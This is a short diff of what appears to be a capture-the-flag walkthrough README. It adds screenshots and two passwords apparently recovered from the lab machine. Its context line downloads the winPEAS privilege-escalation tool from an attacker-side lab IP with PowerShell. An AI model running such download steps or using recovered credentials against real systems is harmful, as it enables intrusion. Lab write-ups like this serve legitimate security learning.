@@ -202,6 +202,17 @@ Invoke-WebRequest -Uri 10.10.14.20:8000/winPEASx64.exe -OutFile winpeas.exe
 
 ![image](https://user-images.githubusercontent.com/19478700/173319106-86d50ee4-c091-474b-b2d8-5f94ed0e127d.png)
 
+My pass is :  E3R$Q62^12p7PLlC%KWaxuaV
+
+
+![image](https://user-images.githubusercontent.com/19478700/173321231-fa385579-6034-48a4-b496-8f10195f165c.png)
+![image](https://user-images.githubusercontent.com/19478700/173321468-1b361114-94aa-478d-8529-0db4d7bc5ce3.png)
+
+
+`
+pass: : 'G!OSV[!-e[-w).,4rK6G,78/
+``
+
 
 
 <!-- LICENSE -->
